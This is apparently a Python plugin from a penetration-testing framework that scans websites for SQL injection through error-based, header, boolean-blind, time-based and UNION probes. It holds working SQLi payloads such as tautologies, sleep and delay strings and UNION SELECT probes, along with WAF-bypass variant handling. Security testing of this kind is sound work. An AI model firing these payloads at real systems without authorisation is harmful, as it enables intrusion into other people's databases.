"""SQL injection detection — error-based, time-based blind, boolean blind, UNION probe.

Uses PayloadEngine for payloads, WafBypassEngine for WAF evasion,
ResponseDiffer for boolean blind comparison. Error patterns from sqlmap/OWASP.
Level: sqlmap-lite (detection, not exploitation).
"""

from __future__ import annotations

import logging
import re
import time
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import DbmsType, PayloadCategory

logger = logging.getLogger(__name__)

# ── Error patterns by DBMS (sourced from sqlmap + PayloadsAllTheThings) ──────
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_", "com.mysql.jdbc", "mysqlclient",
        "mysql_fetch", "mysql_num_rows", "mysqld_safe",
        "sequel::mysql", r"mysql_connect\(", r"mysql_result\(",
        "supplied argument is not a valid mysql",
        "column count doesn't match",
        "the used select statements have a different",
        "unknown column", "table.*doesn't exist",
    ],
    "PostgreSQL": [
        "pg_query", "pg_exec", "syntax error at or near",
        "org.postgresql", "psqlexception",
        "unterminated quoted string at or near",
        "invalid input syntax for", r"pg_connect\(",
        "current transaction is aborted",
        "relation.*does not exist", "column.*does not exist",
        "operator does not exist",
    ],
    "MSSQL": [
        "microsoft ole db provider for sql server",
        "unclosed quotation mark after the character string",
        "microsoft sql server", "sqlserver jdbc driver",
        "com.microsoft.sqlserver.jdbc", "sql server native client",
        "incorrect syntax near", "invalid column name",
        "invalid object name", "conversion failed when converting",
        "arithmetic overflow error",
    ],
    "Oracle": [
        "ora-01756", "ora-00933", "ora-06512", "ora-01722",
        "ora-00904", "oracle error", "oracle.*driver",
        "quoted string not properly terminated",
        "sql command not properly ended", "ora-00942",
        "ora-06550", "ora-00936",
    ],
    "SQLite": [
        "sqlite3.operationalerror", "sqlite_error",
        "unrecognized token", r"near .+: syntax error",
        "sqlite.exception", "no such table", "no such column",
        "sequelizedatabaseerror", "sqlite_range",
        "sqlite_misuse", "sqlite_constraint",
    ],
    "HSQLDB": [
        "org.hsqldb", "hsqldb", "unexpected token",
        "user lacks privilege or object not found",
        "integrity constraint violation",
        "cardinality violation", "data exception",
        "incompatible data type in conversion",
        "sql state.*22", "sql state.*42",
        "java.sql.sqlsyntaxerrorexception",
        "bad sql grammar", "malformed string",
    ],
    "IBM DB2": [
        "db2 sql error", "com.ibm.db2", "sqlcode=-",
        "cli driver", "db2 for",
    ],
    "Generic": [
        "sqlstate", "sql syntax", "sql error", "odbc error",
        "jdbc error", "unterminated string",
        "unexpected end of sql", "division by zero",
        "you have an error in your sql",
        "mysql server version for the right syntax",
    ],
}

ALL_ERROR_PATTERNS: list[tuple[str, str]] = []
for _dbms, _patterns in SQL_ERROR_PATTERNS.items():
    for _p in _patterns:
        ALL_ERROR_PATTERNS.append((_dbms, _p))

# Map DBMS name → DbmsType
_DBMS_MAP: dict[str, DbmsType] = {
    "MySQL": DbmsType.MYSQL, "PostgreSQL": DbmsType.POSTGRES,
    "MSSQL": DbmsType.MSSQL, "Oracle": DbmsType.ORACLE,
    "SQLite": DbmsType.SQLITE, "HSQLDB": DbmsType.MYSQL,
}

# Common injectable parameters
SQLI_PARAMS = [
    "id", "page", "q", "search", "cat", "category", "item", "product",
    "user", "uid", "name", "type", "sort", "order", "lang", "year",
    "month", "article", "view", "action", "file", "report", "table",
    "email", "username", "password", "comment", "review",
    "login", "title", "movie", "content", "no", "num", "number",
    "query", "keyword", "filter", "val", "value", "input", "txt",
]

# Pages to probe
SQLI_PATHS = [
    "/", "/search", "/products", "/news", "/index.php", "/api/v1/search",
    "/rest/products/search", "/rest/user/login",
]

# Header injection points
INJECTABLE_HEADERS = [
    ("User-Agent", "Mozilla/5.0 '"),
    ("Referer", "http://example.com/'"),
    ("X-Forwarded-For", "127.0.0.1'"),
]

TIME_THRESHOLD = 4.5
CONFIRM_RETRIES = 1

# Path prefixes that typically expect JSON POST bodies (REST APIs)
_JSON_PATH_PREFIXES = ("/rest/", "/api/", "/graphql")


def _is_json_endpoint(path: str) -> bool:
    """Detect REST/API endpoints that expect JSON POST bodies."""
    return any(path.startswith(p) for p in _JSON_PATH_PREFIXES)

# Params that are clearly not injectable (form buttons, CSRF tokens, etc.)
_SKIP_PARAMS: set[str] = {
    "submit", "login", "logout", "reset", "user_token", "csrf_token",
    "csrf", "_token", "token", "captcha", "recaptcha", "g-recaptcha-response",
    "btnsubmit", "button", "action", "go", "send", "save",
}




class SqliBasicPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sqli_basic",
        display_name="SQL Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects SQL injection via error-based, time-based blind, "
            "boolean blind, UNION probing, and header injection"
        ),
        produces=["sqli_findings"],
        timeout=120.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"sqli_tests": []},
            )

        # Detect SPA baseline (catch-all route)
        spa_baseline = await self._fetch_spa_baseline(ctx, base_url)
        logger.debug(
            "base_url=%s, spa_baseline=%d bytes, should_stop=%s",
            base_url, len(spa_baseline), ctx.should_stop,
        )

        # Collect injection points from crawled data + hardcoded fallbacks
        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            target.host, ctx,
            hardcoded_paths=SQLI_PATHS,
            hardcoded_params=SQLI_PARAMS,
            param_filter=SQLI_PARAMS,
            max_points=25,
        )
        logger.debug(
            "injection points: %d, first=%s",
            len(inj_points),
            f"{inj_points[0].method} {inj_points[0].path} {inj_points[0].params}"
            if inj_points else "none",
        )

        # Get payloads from PayloadEngine
        error_payloads = self._get_error_payloads(ctx)
        time_payloads = self._get_time_payloads(ctx)
        boolean_payloads = self._get_boolean_payloads(ctx)

        detected_dbms: str | None = None
        found_set: set[str] = set()  # track "method:path:param" to skip duplicates

        def _save_partial() -> None:
            """Save current findings as partial result so timeout doesn't lose data."""
            ctx._partial_result = PluginResult.success(
                self.meta.name, target.host,
                findings=list(findings),
                data={"sqli_tests": list(tested), "detected_dbms": detected_dbms},
            )

        # ── Phase 1: Error-based detection ────────────────────────────
        for point in inj_points:
            if ctx.should_stop or len(findings) >= 3:
                break
            for param, orig_val in point.params.items():
                if ctx.should_stop or len(findings) >= 3:
                    break
                fkey = f"{point.method}:{point.path}:{param}"
                if fkey in found_set:
                    continue

                if point.method == "POST":
                    use_json = _is_json_endpoint(point.path)
                    baseline_body = await self._fetch_body_post(
                        ctx,
                        f"{base_url}{point.path}",
                        point.build_post_data(param, orig_val or "1"),
                        as_json=use_json,
                    )
                else:
                    baseline_body = await self._fetch_body(
                        ctx, point.build_url(
                            base_url, param, orig_val or "1",
                        ),
                    )
                if baseline_body is None:
                    logger.debug("baseline None for %s param=%s", point.path, param)
                    continue
                if spa_baseline and abs(len(baseline_body) - len(spa_baseline)) < 100:
                    logger.debug(
                        "SPA filter: %s (bl=%d spa=%d)",
                        point.path, len(baseline_body), len(spa_baseline),
                    )
                    break

                # Skip params that are clearly not injectable
                if param.lower() in _SKIP_PARAMS:
                    continue

                param_found = False
                for idx, raw_payload in enumerate(error_payloads[:8]):
                    if ctx.should_stop or param_found:
                        break
                    variants = self._get_variants(ctx, raw_payload)
                    for variant in variants:
                        if point.method == "POST":
                            post_data = point.build_post_data(param, variant,
                            )
                            body = await self._fetch_body_post(
                                ctx, f"{base_url}{point.path}", post_data,
                                as_json=use_json,
                            )
                            url = f"{base_url}{point.path} [POST {param}]"
                        else:
                            url = point.build_url(
                                base_url, param, variant,
                            )
                            body = await self._fetch_body(ctx, url)
                        if body is None:
                            continue

                        # Quick relevance check: if the first payload
                        # returns a response of nearly the same size as
                        # baseline, the server likely ignores this param.
                        if idx == 0 and abs(len(body) - len(baseline_body)) < 20:
                            dbms_probe = self._match_error(body, baseline_body)
                            if not dbms_probe:
                                break  # skip remaining payloads

                        dbms_hit = self._match_error(body, baseline_body)
                        if dbms_hit:
                            logger.debug(
                                "SQLi FOUND: %s param=%s dbms=%s payload=%s",
                                point.path, param, dbms_hit, raw_payload,
                            )
                            if not detected_dbms:
                                detected_dbms = dbms_hit
                            found_set.add(fkey)
                            param_found = True
                            method_label = f" [{point.method}]" if point.method == "POST" else ""
                            tested.append({
                                "url": url, "payload": raw_payload,
                                "dbms": dbms_hit, "type": "error-based",
                            })
                            findings.append(Finding.critical(
                                f"SQL injection ({dbms_hit}): "
                                f"{point.path}?{param}={method_label}",
                                description=(
                                    f"SQL error from {dbms_hit} with "
                                    f"payload: {raw_payload}"
                                ),
                                evidence=f"URL: {url}",
                                confidence=0.9,
                                remediation=(
                                    "Use parameterized queries / "
                                    "prepared statements"
                                ),
                                tags=["pentesting", "sqli", dbms_hit.lower()],
                            ))
                            _save_partial()
                            break

        # ── Phase 2: Header-based error detection ─────────────────────
        if not findings and not ctx.should_stop:
            for hdr_name, hdr_payload in INJECTABLE_HEADERS:
                if ctx.should_stop:
                    break
                body = await self._fetch_body_with_header(
                    ctx, base_url, hdr_name, hdr_payload,
                )
                if body is None:
                    continue
                dbms_hit = self._match_error(body)
                if dbms_hit:
                    tested.append({
                        "header": hdr_name, "payload": hdr_payload,
                        "dbms": dbms_hit, "type": "header-error",
                    })
                    findings.append(Finding.critical(
                        f"SQL injection via {hdr_name} header ({dbms_hit})",
                        evidence=(
                            f"Header: {hdr_name}: {hdr_payload}\n"
                            f"DBMS: {dbms_hit}\nResponse: {body[:200]}"
                        ),
                        description=f"SQL error triggered via {hdr_name}: {hdr_payload}",
                        remediation="Sanitize all input sources including HTTP headers",
                        tags=["pentesting", "sqli", "header", dbms_hit.lower()],
                    ))
                    _save_partial()
                    break

        # ── Phase 3: Boolean blind detection ──────────────────────────
        if len(findings) < 3 and not ctx.should_stop:
            for point in inj_points:
                if ctx.should_stop or len(findings) >= 3:
                    break
                for param in point.params:
                    if ctx.should_stop or len(findings) >= 3:
                        break
                    if param.lower() in _SKIP_PARAMS:
                        continue
                    fkey = f"{point.method}:{point.path}:{param}"
                    if fkey in found_set:
                        continue
                    true_payloads = [p for p in boolean_payloads if "true" in p[1]]
                    false_payloads = [p for p in boolean_payloads if "false" in p[1]]
                    if not true_payloads or not false_payloads:
                        continue

                    param_found = False
                    use_json = _is_json_endpoint(point.path)
                    for true_p, _ in true_payloads[:3]:
                        for false_p, _ in false_payloads[:3]:
                            if ctx.should_stop or param_found:
                                break
                            if point.method == "POST":
                                true_data = point.build_post_data(
                                    param, true_p,
                                )
                                false_data = point.build_post_data(
                                    param, false_p,
                                )
                                true_body = await self._fetch_body_post(
                                    ctx, f"{base_url}{point.path}", true_data,
                                    as_json=use_json,
                                )
                                false_body = await self._fetch_body_post(
                                    ctx, f"{base_url}{point.path}", false_data,
                                    as_json=use_json,
                                )
                            else:
                                true_body = await self._fetch_body(
                                    ctx, point.build_url(
                                        base_url, param, true_p,
                                    ),
                                )
                                false_body = await self._fetch_body(
                                    ctx, point.build_url(
                                        base_url, param, false_p,
                                    ),
                                )
                            if true_body is None or false_body is None:
                                continue

                            # Compare responses — both must look like
                            # real pages (>500 bytes) to avoid FP from
                            # error pages, redirects, or broken sessions
                            min_len = min(len(true_body), len(false_body))
                            if min_len > 500:
                                sim = self._similarity(true_body, false_body)
                                if sim < 0.85 and abs(len(true_body) - len(false_body)) > 100:
                                    # Confirm with retry
                                    if point.method == "POST":
                                        true2 = await self._fetch_body_post(
                                            ctx, f"{base_url}{point.path}", true_data,
                                            as_json=use_json,
                                        )
                                    else:
                                        true2 = await self._fetch_body(
                                            ctx, point.build_url(
                                                base_url, param, true_p,
                                            ),
                                        )
                                    if true2 and self._similarity(true_body, true2) > 0.95:
                                        found_set.add(fkey)
                                        param_found = True
                                        tested.append({
                                            "param": param, "true": true_p,
                                            "false": false_p, "type": "boolean-blind",
                                            "similarity": round(sim, 3),
                                        })
                                        findings.append(Finding.high(
                                            f"Boolean blind SQLi: "
                                            f"{point.path}?{param}=",
                                            description=(
                                                f"Different responses for true/false "
                                                f"conditions. Similarity: {sim:.1%}"
                                            ),
                                            evidence=(
                                                f"True: {true_p} ({len(true_body)} bytes)\n"
                                                f"False: {false_p} ({len(false_body)} bytes)"
                                            ),
                                            confidence=0.5,
                                            remediation=(
                                                "Use parameterized queries / "
                                                "prepared statements"
                                            ),
                                            tags=[
                                                "pentesting", "sqli", "blind", "boolean",
                                            ],
                                        ))
                                        _save_partial()
                                        break
                        if param_found:
                            break

        # ── Phase 4: Time-based blind ─────────────────────────────────
        if len(findings) < 3 and not ctx.should_stop:
            for point in inj_points:
                if ctx.should_stop or len(findings) >= 3:
                    break
                # Time-based works on both GET and POST (including form POST)
                for param in point.params:
                    if ctx.should_stop or len(findings) >= 3:
                        break
                    if param.lower() in _SKIP_PARAMS:
                        continue
                    fkey = f"{point.method}:{point.path}:{param}"
                    if fkey in found_set:
                        continue

                    if point.method == "POST":
                        use_json = _is_json_endpoint(point.path)
                        bl_data = point.build_post_data(
                            param, orig_val or "1",
                        )
                        baseline_time = await self._measure_post(
                            ctx, f"{base_url}{point.path}", bl_data,
                            as_json=use_json,
                        )
                    else:
                        baseline_url = point.build_url(
                            base_url, param, "1",
                        )
                        baseline_time = await self._measure(ctx, baseline_url)
                    if baseline_time is None:
                        continue

                    param_found = False
                    for payload, _delay in time_payloads:
                        if ctx.should_stop or param_found:
                            break
                        variants = self._get_variants(ctx, payload)
                        for variant in variants[:2]:
                            if point.method == "POST":
                                post_data = point.build_post_data(
                                    param, variant,
                                )
                                elapsed = await self._measure_post(
                                    ctx, f"{base_url}{point.path}", post_data,
                                    as_json=use_json,
                                )
                                url = f"{base_url}{point.path} [POST {param}]"
                            else:
                                url = point.build_url(
                                    base_url, param, variant,
                                )
                                elapsed = await self._measure(ctx, url)
                            if elapsed is None:
                                continue

                            delta = elapsed - baseline_time
                            if delta < TIME_THRESHOLD:
                                continue

                            # Confirm
                            if point.method == "POST":
                                new_baseline = await self._measure_post(
                                    ctx, f"{base_url}{point.path}", bl_data,
                                    as_json=use_json,
                                )
                                retry = await self._measure_post(
                                    ctx, f"{base_url}{point.path}", post_data,
                                    as_json=use_json,
                                )
                            else:
                                new_baseline = await self._measure(ctx, baseline_url)
                                retry = await self._measure(ctx, url)
                            if new_baseline is None or retry is None:
                                continue
                            if retry - new_baseline < TIME_THRESHOLD:
                                continue

                            found_set.add(fkey)
                            param_found = True
                            tested.append({
                                "param": param, "payload": payload,
                                "type": "time-based",
                                "baseline": round(baseline_time, 2),
                                "elapsed": round(elapsed, 2),
                                "confirmed": True,
                            })
                            findings.append(Finding.high(
                                f"Time-based blind SQLi: "
                                f"{point.path}?{param}=",
                                description=(
                                    f"Response delayed {delta:.1f}s with "
                                    f"payload: {payload} (confirmed with retry)"
                                ),
                                evidence=(
                                    f"Baseline: {baseline_time:.2f}s, "
                                    f"Payload: {elapsed:.2f}s, "
                                    f"Retry: {retry:.2f}s"
                                ),
                                confidence=0.7,
                                remediation=(
                                    "Use parameterized queries / "
                                    "prepared statements"
                                ),
                                tags=["pentesting", "sqli", "blind", "time"],
                            ))
                            _save_partial()
                            break

        # ── Phase 5: UNION column count probe ─────────────────────────
        if len(findings) < 3 and not ctx.should_stop:
            for point in inj_points:
                if ctx.should_stop or len(findings) >= 3:
                    break
                # UNION probe works on both GET and POST
                for param in point.params:
                    if ctx.should_stop or len(findings) >= 3:
                        break
                    if param.lower() in _SKIP_PARAMS:
                        continue
                    fkey = f"{point.method}:{point.path}:{param}"
                    if fkey in found_set:
                        continue
                    col_count = await self._detect_columns(
                        ctx, base_url, point, param,
                    )
                    if col_count:
                        found_set.add(fkey)
                        tested.append({
                            "param": param, "type": "union",
                            "columns": col_count,
                        })
                        findings.append(Finding.medium(
                            f"UNION injection possible: "
                            f"{point.path}?{param}= ({col_count} columns)",
                            description=(
                                f"UNION SELECT with {col_count} NULLs "
                                f"returns valid response"
                            ),
                            confidence=0.6,
                            remediation=(
                                "Use parameterized queries / "
                                "prepared statements"
                            ),
                            tags=["pentesting", "sqli", "union"],
                        ))
                        _save_partial()
                        break

        if not findings:
            findings.append(Finding.info(
                "No SQL injection detected", tags=["pentesting", "sqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "sqli_tests": tested,
                "detected_dbms": detected_dbms,
            },
        )

    # ── Payload helpers ───────────────────────────────────────────────

    @staticmethod
    def _get_error_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.SQLI, max_waf=1, limit=30)
            return [p.value for p in payloads if not p.blind]
        return [
            "'", '"', "1'", "1' OR '1'='1", "1; SELECT 1--",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "'))", "')) OR 1=1--", "')) UNION SELECT NULL--",
            "' OR 1=1--", "1' OR '1'='1'--",
        ]

    @staticmethod
    def _get_time_payloads(ctx) -> list[tuple[str, float]]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(
                PayloadCategory.SQLI, blind_only=True, max_waf=1, limit=10,
            )
            return [(p.value, p.time_delay) for p in payloads if p.time_delay > 0]
        return [
            ("' OR SLEEP(5)-- -", 5.0),
            ("' OR pg_sleep(5)-- -", 5.0),
            ("'; WAITFOR DELAY '0:0:5'-- -", 5.0),
        ]

    @staticmethod
    def _get_boolean_payloads(ctx) -> list[tuple[str, str]]:
        """Return (payload, 'true'|'false') pairs for boolean blind."""
        return [
            ("1' AND 1=1--", "true"),
            ("1' AND 1=2--", "false"),
            ("1' AND 'a'='a", "true"),
            ("1' AND 'a'='b", "false"),
            ("1 AND 1=1", "true"),
            ("1 AND 1=2", "false"),
        ]

    @staticmethod
    def _get_variants(ctx, payload: str) -> list[str]:
        """Get WAF bypass variants of a payload."""
        variants = [payload]
        if hasattr(ctx, "waf_bypass") and ctx.waf_bypass and ctx.waf_bypass.waf_detected:
            encoded = ctx.waf_bypass.encode(payload)
            for v in encoded:
                if v not in variants:
                    variants.append(v)
        return variants[:4]

    # ── Network helpers ───────────────────────────────────────────────

    async def _fetch_body(self, ctx, url: str) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, timeout=10.0)
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception:
            # Fallback to fresh session on shared pool timeout
            return await self._fetch_body_fresh(ctx, url)

    async def _fetch_body_fresh(self, ctx, url: str) -> str | None:
        """Fetch via fresh aiohttp session (avoids stale connection pool)."""
        import aiohttp as _aiohttp

        try:
            async with _aiohttp.ClientSession(
                timeout=_aiohttp.ClientTimeout(total=10),
            ) as session, ctx.rate:
                resp = await session.get(url, ssl=False)
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception as e:
            logger.debug("SQLi probe failed: %s (%s)", e, type(e).__name__)
            return None

    async def _fetch_body_post(
        self, ctx, url: str, data: dict, as_json: bool = False,
    ) -> str | None:
        try:
            async with ctx.rate:
                if as_json:
                    resp = await ctx.http.post(url, json=data, timeout=10.0)
                else:
                    resp = await ctx.http.post(url, data=data, timeout=10.0)
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception:
            # Fallback to fresh session
            return await self._fetch_body_post_fresh(ctx, url, data, as_json)

    async def _fetch_body_post_fresh(
        self, ctx, url: str, data: dict, as_json: bool = False,
    ) -> str | None:
        """POST via fresh aiohttp session."""
        import aiohttp as _aiohttp

        try:
            async with _aiohttp.ClientSession(
                timeout=_aiohttp.ClientTimeout(total=10),
            ) as session, ctx.rate:
                if as_json:
                    resp = await session.post(url, json=data, ssl=False)
                else:
                    resp = await session.post(url, data=data, ssl=False)
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception as e:
            logger.debug("SQLi POST probe failed: %s (%s)", e, type(e).__name__)
            return None

    async def _fetch_body_with_header(
        self, ctx, base_url: str, hdr_name: str, hdr_value: str,
    ) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    base_url, headers={hdr_name: hdr_value}, timeout=6.0,
                )
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception as e:
            logger.debug("SQLi probe failed: %s (%s)", e, type(e).__name__)
            return None

    async def _fetch_spa_baseline(self, ctx, base_url: str) -> str:
        try:
            async with ctx.rate:
                r = await ctx.http.get(
                    f"{base_url}/_nonexistent_8x7z_sqli/", timeout=5.0,
                )
                if r.status == 200:
                    return await r.text(encoding="utf-8", errors="replace")
        except Exception as e:
            logger.debug("SQLi probe failed: %s", e)
            pass
        return ""

    async def _measure(self, ctx, url: str) -> float | None:
        try:
            async with ctx.rate:
                start = time.monotonic()
                await ctx.http.get(url, timeout=12.0)
                return time.monotonic() - start
        except Exception as e:
            logger.debug("SQLi probe failed: %s", e)
            return None

    async def _measure_post(
        self, ctx, url: str, data: dict, as_json: bool = False,
    ) -> float | None:
        try:
            async with ctx.rate:
                start = time.monotonic()
                if as_json:
                    await ctx.http.post(url, json=data, timeout=12.0)
                else:
                    await ctx.http.post(url, data=data, timeout=12.0)
                return time.monotonic() - start
        except Exception as e:
            logger.debug("SQLi POST probe failed: %s", e)
            return None

    # ── Detection helpers ─────────────────────────────────────────────

    @staticmethod
    def _match_error(body: str, baseline: str = "") -> str | None:
        """Check body for SQL error patterns, return DBMS name or None."""
        body_lower = body.lower()
        baseline_lower = baseline.lower() if baseline else ""
        for dbms, pattern in ALL_ERROR_PATTERNS:
            try:
                found = re.search(pattern, body_lower) is not None
            except re.error:
                found = pattern in body_lower
            if found:
                if baseline_lower:
                    try:
                        in_base = re.search(pattern, baseline_lower) is not None
                    except re.error:
                        in_base = pattern in baseline_lower
                    if in_base:
                        continue
                return dbms
        return None

    @staticmethod
    def _similarity(a: str, b: str) -> float:
        """Quick similarity ratio based on length and common prefix/suffix."""
        if not a or not b:
            return 0.0
        if a == b:
            return 1.0
        max_len = max(len(a), len(b))
        min_len = min(len(a), len(b))
        length_sim = min_len / max_len
        # Check common prefix
        common = 0
        for ca, cb in zip(a, b, strict=False):
            if ca == cb:
                common += 1
            else:
                break
        prefix_sim = common / max_len
        return (length_sim + prefix_sim) / 2

    async def _detect_columns(
        self, ctx, base_url: str, point, param: str,
    ) -> int | None:
        """Try ORDER BY / UNION SELECT NULL to detect column count."""
        # ORDER BY approach
        for n in (1, 5, 10, 15, 20, 25, 50, 100):
            if ctx.should_stop:
                return None
            url = point.build_url(base_url, param, f"1 ORDER BY {n}--")
            body = await self._fetch_body(ctx, url)
            if body is None:
                return None
            if self._match_error(body):
                # Error at n means n-1 columns
                if n > 1:
                    # Confirm with UNION SELECT
                    nulls = ",".join(["NULL"] * (n - 1))
                    union_url = point.build_url(
                        base_url, param,
                        f"1 UNION SELECT {nulls}--",
                    )
                    union_body = await self._fetch_body(ctx, union_url)
                    if union_body and not self._match_error(union_body):
                        return n - 1
                return None
        return None
